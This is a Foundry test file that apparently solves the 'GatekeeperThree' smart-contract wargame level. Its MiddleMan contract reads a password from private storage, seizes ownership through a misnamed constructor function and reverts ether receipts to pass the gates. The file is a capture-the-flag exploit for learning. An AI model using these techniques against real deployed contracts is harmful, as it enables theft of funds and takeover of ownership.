// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperThree.sol";

contract MiddleMan {
    function attack(address prey, uint256 password) public {
        GatekeeperThree instance = GatekeeperThree(payable(prey));
        address(instance).call{value: 0.0011 ether}("");
        instance.construct0r();
        instance.getAllowance(password);
        instance.enter();
    }

    receive() external payable {
        revert();
    }
}

contract GatekeeperThreeTest is Test {
    GatekeeperThree instance;

    function setUp() public {
        instance = new GatekeeperThree();
    }

    function test() public {
        assertEq(instance.entrant(), address(0));

        instance.createTrick();
        SimpleTrick trick = SimpleTrick(instance.trick());
        uint256 password = uint256(
            vm.load(address(trick), bytes32(uint256(2)))
        );

        MiddleMan middleMan = new MiddleMan();
        vm.deal(address(middleMan), 1 ether);
        middleMan.attack(address(instance), password);

        assertEq(instance.entrant(), msg.sender);
    }
}
